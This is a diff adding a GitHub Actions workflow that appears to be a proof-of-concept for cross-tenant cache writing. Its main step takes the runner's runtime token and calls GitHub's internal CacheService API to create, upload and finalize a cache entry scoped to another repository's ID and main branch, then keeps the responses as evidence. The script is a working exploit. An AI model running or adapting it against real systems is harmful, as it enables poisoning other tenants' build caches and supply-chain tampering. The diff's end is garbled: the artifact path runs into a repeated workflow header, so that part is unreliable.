@@ -1,6 +1,53 @@
 name: G06 Cache Cross Tenant Writer
 on:
   workflow_dispatch:
+  push:
+    branches: [main]
+jobs:
+  crosswrite:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Bootstrap Actions cache plumbing
+        uses: actions/cache@v4
+        with:
+          path: seed_cache
+          key: g06-crosswrite-seed-${{ github.run_id }}
+      - name: Write A namespace cache canary
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p ab_cache out seed_cache
+          printf "B_CACHE_CROSSWRITE_CANARY_20260804\n" > ab_cache/cache.txt
+          printf "seed\n" > seed_cache/seed.txt
+          tar -czf out/cache.tgz ab_cache
+          base="${ACTIONS_RESULTS_URL%/}"
+          tok="${ACTIONS_RUNTIME_TOKEN}"
+          key="ab-crosswrite-poc-28846338784"
+          version="3d21fd69cb5beab0e9a17bac72ea45f1318ffaa15426a0f433482e5944100f0b"
+          target_repo_id="1322235892"
+          body=$(jq -n --arg key "$key" --arg version "$version" --arg rid "$target_repo_id" "{key:\$key,version:\$version,metadata:{repository_id:(\$rid|tonumber),scope:[{scope:\"refs/heads/main\",permission:3}]}}")
+          printf "%s\n" "$body" > out/create-request.json
+          create_url="$base/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry"
+          status=$(curl -sS -o out/create-response.json -w "%{http_code}" -H "Authorization: Bearer $tok" -H "Content-Type: application/json" -H "Accept: application/json" --data "$body" "$create_url")
+          echo "CREATE_HTTP=$status" | tee out/summary.txt
+          cat out/create-response.json >> out/summary.txt
+          upload_url=$(jq -r ".signed_upload_url // empty" out/create-response.json)
+          test -n "$upload_url"
+          curl -sS -X PUT "$upload_url" --data-binary @out/cache.tgz -o out/upload-response.txt -w "UPLOAD_HTTP=%{http_code}\n" | tee -a out/summary.txt
+          size=$(stat -c%s out/cache.tgz)
+          finalize_body=$(jq -n --arg key "$key" --arg version "$version" --arg size "$size" "{key:\$key,version:\$version,size_bytes:(\$size|tonumber)}")
+          finalize_url="$base/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload"
+          final_status=$(curl -sS -o out/finalize-response.json -w "%{http_code}" -H "Authorization: Bearer $tok" -H "Content-Type: application/json" -H "Accept: application/json" --data "$finalize_body" "$finalize_url")
+          echo "FINALIZE_HTTP=$final_status" | tee -a out/summary.txt
+          cat out/finalize-response.json >> out/summary.txt
+      - name: Upload crosswrite evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: g06-cache-crosswrite-evidence
+          path: out/name: G06 Cache Cross Tenant Writer
+on:
+  workflow_dispatch:
 jobs:
   crosswrite:
     runs-on: ubuntu-latest
